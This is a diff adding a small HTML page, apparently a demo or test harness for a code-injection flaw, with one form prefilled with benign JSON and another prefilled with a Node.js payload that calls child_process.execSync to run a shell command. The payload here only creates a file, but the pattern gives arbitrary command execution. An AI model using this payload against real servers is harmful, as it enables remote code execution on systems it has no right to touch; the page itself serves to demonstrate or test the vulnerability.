@@ -1,0 +1,19 @@
+<html>
+<body>
+    <title>Require Security</title>
+
+    Please Submit a benign JSON String.
+    <form method="post" action="inbound">
+        <label>JSON: </label>
+        <input type="text" name="json_str" value="{'a': 'b'}"/>
+        <input type="submit" value="Submit"/>
+    </form>
+
+    Please Submit an exploit JSON String.
+    <form method="post" action="inbound">
+        <label>JSON: </label>
+        <input type="text" name="json_str" size="45" value="require('node:child_process').execSync('touch /tmp/exploit')"/>
+        <input type="submit" value="Submit"/>
+    </form>
+</body>
+</html>
